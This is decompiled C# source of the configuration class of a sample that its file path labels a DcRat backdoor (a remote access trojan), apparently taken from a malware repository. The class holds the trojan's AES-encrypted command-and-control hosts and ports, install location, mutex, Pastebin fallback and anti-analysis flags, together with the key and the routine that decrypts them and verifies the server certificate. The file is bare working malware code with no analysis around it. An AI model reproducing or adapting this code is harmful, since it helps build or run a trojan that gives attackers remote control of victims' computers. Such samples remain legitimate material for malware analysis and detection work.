// Decompiled with JetBrains decompiler
// Type: Client.Settings
// Assembly: Hau, Version=1.0.7.0, Culture=neutral, PublicKeyToken=null
// MVID: 43E252B6-B9CE-452D-8541-D8645EC414DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.DcRat.gen-b46a6ed5d0d601aa0e1087095ddea928405c927d65ab795aca3a148d2fb37d13.exe

using Client.Algorithm;
using Client.Helper;
using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Client
{
  public static class Settings
  {
    public static string Por_ts = "pl9SZiskmYFmta0gT77kQKepEAlGy7gvG7OsE4+HRJlQRrxzVvXdWyxAqIRfNVdAcmKfraIfvZ+l26Kn0DFisA==";
    public static string Hos_ts = "0Amxa/gfHhxMyJBRLUBEu7uy7CwMrfEecjApIizlJpye99s1ZtCKdkcOEuetwCEEHCaxfiSxaEOJpZLRROJ6dw==";
    public static string Ver_sion = "QPazag4qgl4WRb+UgdgpMP4n30e8+vqJKlBauzWPvvS1fFdsSNEb8ild3YwyIdeVWb4ZQkaYdehAJvEhcd5feA==";
    public static string In_stall = "bp87fckXowyaZ8zpvXzvBmfRphSjYf0oCXLMmtiLlYJmn93bKUbGrzzT9rAXpfJzHiTf/qkAiPgdi5o1Aiv5Ag==";
    public static string Install_Folder = "%AppData%";
    public static string Install_File = "";
    public static string Key = "SUFtcDZJNHg1M1dkOWg3VXk0WmtHdzNtMFFrUllaVXQ=";
    public static string MTX = "no4kRr1yTlKoCs2bYyr5EFMHU3zPnTLT5JNdrgWpJmIP6ZFPP9/orroZgQBB69/CmciUkHIhtD2wTygXb4lGDg==";
    public static string Certifi_cate = "3Z9OiR1osy9Dlhl/7QFGrEDH3AVO1zUoTNSgSp3MPEDq9s7NRvQ+c2775U4re9/6TixOil61T2mGf0ITV2Y3+1cT0bkEa4rFr9qgEXm3dSwXmVzQI7l05mB4CW1y5KCC8MrMgAJ/rIOKdzlP2Wyv6nnK0xz0BbOG0EUZAj/BIAN3LCi5KkRNlYkBCc0Ziql5x7eNGzsX26vA/A6+4Ww3tURQCuj/1W6fDn041zzl84gHtVusk+UDe4oeAYpnX4olFYUmGH0YImsidD10XzEQQy0V7+nV68fo0ylOHCFlQTUTvcDUy+e1XoIYHQl914lZt8qSfbvMcpgKb2eiNDYG3Pzr3aa591F2voLfMVJWOtlVGP3ABPhwAcotgeZiTXE7aXQXDtvuNSITCApiXEUrDHzsTG/lgVSSplYZwJW9q0WJkUhVApzC8Tqamv6x84Mcnh+Kp2ZD34BWTZ305Yf0YfSaRVawse36w7dVt6PLFi7Q7MIvitUzE9nr+RPRsgLDNyGn17flr5MSDTyOyufUh4bmALb6LE8LaUmlUI8BLgR4lthwMZKkbJUwZAHOX7ZWvgOZy4RrrPnTXH/4VAj5S/TutWKTbZgS1hAcvD4mjX2xowQmDAN9UC1FWOIRelr5/qsr4BR+QH4WHGQiEvk1+CUiy59xCZGPj+lFp619w/0QN+A2SMdNztgjLpjLWcZ8/Zn9XXkg1yvcaBXjtImwt0EV1iM3aaXTkKY1Q7PfmLCIseRWU6N1OMmenjSWBjRpTp85AHgMpVFhPEeoNjumUvy3k6b9BHzA86zYvVu3NClcyforn2LOKxL3OtfhBEbQf23xUs2C1ZjEbIy+7CTJaSvemTpsX1QS0w5WW1QIi04yYyVwZNRMyGvAORILaPo5C+nSk9mUrwCwWX9sp7dgKttzIb1VbtJdSUodZF0jZgdHjpna/vSu1NVM5uMe6A1aLfg7a1/TWUUs0y7c58ok3F0dHjVb2PPBhWcR9z+bRJlmg7hEluZj2kRWCq8w8KTkMjj76pTuzicWR49OO/+R4JmvxriJSDi1NduruJu3j2o=";
    public static string Server_signa_ture = "h2j+jBsqZZgbUwJ+qffs2vZHrR2wiuVvYhx5wXSRe1Fw9diCIjef0C3qmdmJGyfCRFydbH+yV0flqwstJ2NwoVomS7uuKrHxzI/v6cKvZeNi5SDw2tK9mmQDFscElS54vCclZh0Z2ztqM9eRutoIFiG8EXPzmeEyS3hpcJYTqoHyS4ZXotSaXgzDq5DjsDawFluUlaMHwNORdqW08rwlFCamI7vy+77H+ojqsZKBP9C64EUIo7n2MNN3Nz1R8hA6DPuzvHjFkMRRi7Qzejt7lUzDLmVAGvCjnk9rbolEkPc=";
    public static X509Certificate2 Server_Certificate;
    public static Aes256 aes256;
    public static string Paste_bin = "5+3zg9L7XSFm4kS5H3wEx2MHIGKqF8LdQm1//MVJ+r4Uk3QA9lO/yYctLJtFzI3y2EmVG5fWiDt7tD+SOtsjPQ==";
    public static string BS_OD = "TmAM9iN5c6A5Ih3Tozs6O3BcRwXVwlWT9jT0PLsf2X3G4lzZ+AtoIPv0d5bx6SQhnLz1l82YQi56jFqW/RKATg==";
    public static string Hw_id = (string) null;
    public static string De_lay = "1";
    public static string Group = "0rWtCVQNe0XXDp/PQIVzKecrOIt7sL5isJijzhjBAupj+rwOf41dCrFoCtfLeIArrWgI27R15JRJvmHg9Br/yw==";
    public static string Anti_Process = "kN6+64idc7sIzqFoFc+OIUppE/OBvw6p8Z6cgUf/1h8hdO8fcJfPIG0uo85sFnxTYK+RQ162I05YTu4exE7T6A==";
    public static string An_ti = "4lbK3i38148SAoNgwSoAr8TkO6FQj8m+4WBN63BZyrzvO4Ni22MzNu0uT+BHegg+PRMM5qD8XqSTRLjl+3pjwQ==";

    public static bool InitializeSettings()
    {
      try
      {
        Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
        Settings.aes256 = new Aes256(Settings.Key);
        Settings.Por_ts = Settings.aes256.Decrypt(Settings.Por_ts);
        Settings.Hos_ts = Settings.aes256.Decrypt(Settings.Hos_ts);
        Settings.Ver_sion = Settings.aes256.Decrypt(Settings.Ver_sion);
        Settings.In_stall = Settings.aes256.Decrypt(Settings.In_stall);
        Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
        Settings.Paste_bin = Settings.aes256.Decrypt(Settings.Paste_bin);
        Settings.An_ti = Settings.aes256.Decrypt(Settings.An_ti);
        Settings.Anti_Process = Settings.aes256.Decrypt(Settings.Anti_Process);
        Settings.BS_OD = Settings.aes256.Decrypt(Settings.BS_OD);
        Settings.Group = Settings.aes256.Decrypt(Settings.Group);
        Settings.Hw_id = HwidGen.HWID();
        Settings.Server_signa_ture = Settings.aes256.Decrypt(Settings.Server_signa_ture);
        Settings.Server_Certificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certifi_cate)));
        return Settings.VerifyHash();
      }
      catch
      {
        return false;
      }
    }

    private static bool VerifyHash()
    {
      try
      {
        using (SHA256Managed shA256Managed = new SHA256Managed())
          return ((RSACryptoServiceProvider) Settings.Server_Certificate.PublicKey.Key).VerifyHash(shA256Managed.ComputeHash(Encoding.UTF8.GetBytes(Settings.Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Settings.Server_signa_ture));
      }
      catch (Exception ex)
      {
        return false;
      }
    }
  }
}
